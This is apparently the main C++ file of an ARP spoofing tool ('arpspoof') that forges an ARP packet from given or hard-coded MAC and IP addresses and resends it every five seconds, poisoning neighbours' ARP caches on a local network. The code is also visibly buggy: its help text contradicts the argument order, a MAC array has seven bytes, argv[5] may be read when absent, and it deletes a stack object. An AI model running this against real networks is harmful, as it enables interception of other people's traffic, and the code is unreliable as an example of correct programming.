#include <iostream>
#include "arppacket.h"

int main(int argc, char* argv[])
{
    if(argc == 1){
        std::cout << "Help: ./arpspoof sourceMAC targetMAC sourceIP targetIP interface" << std::endl;
        return 0;
    }

    EthernetPacket eth;

    if(argc >= 5){
        eth.setSIP(argv[1]);
        eth.setTIP(argv[2]);
        eth.setSMAC(argv[3]);
        eth.setTMAC(argv[4]);
    } else {
        char srcMAC[] = {1,2,3,4,5,6,7};
        char trgMAC[] = {0xff,0xff,0xff,0xff,0xff,0xff};
        char srcIP[] = {192, 168, 1, 2};
        char trgIP[] = {192, 168, 1, 1};
        eth.setSIP(srcIP);
        eth.setTIP(trgIP);
        eth.setSMAC(srcMAC);
        eth.setTMAC(trgMAC);
    }
    std::cout << eth.toString() << std::endl;

    EthernetPacket * e = &eth;
    while(1){
        sendPacket(e, argv[5]);
        // std::cout << "reply sent" << std::endl;
        usleep(5*1000000);
    }

    delete e;

    return 0;
}